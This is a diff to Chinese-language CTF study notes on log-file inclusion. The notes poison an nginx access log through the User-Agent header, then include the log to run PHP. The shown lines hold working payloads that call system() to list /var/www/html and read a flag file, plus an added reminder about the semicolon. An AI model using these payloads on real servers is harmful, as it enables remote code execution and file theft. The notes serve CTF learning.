@@ -101,7 +101,7 @@
 
 <br>
 
-#### 日志文件包含：（抓包改UA，在UA末尾加东西）（用于include）
+#### 日志文件包含：（抓包改UA，在UA末尾加东西）（用于include且其他伪协议无法使用的时候）
 * 如：
 ````
 GET /?file=/var/log/nginx/access.log HTTP/1.1
@@ -124,6 +124,8 @@ Connection: close
 * ?file=/var/log/nginx/access.log&2=system('ls /var/www/html');phpinfo();
 
 * ?file=/var/log/nginx/access.log&2=system('tac /var/www/html/fl0g.php');phpinfo();
+
+特别注意这里的system();是有分号的！！
 
 
 <br>
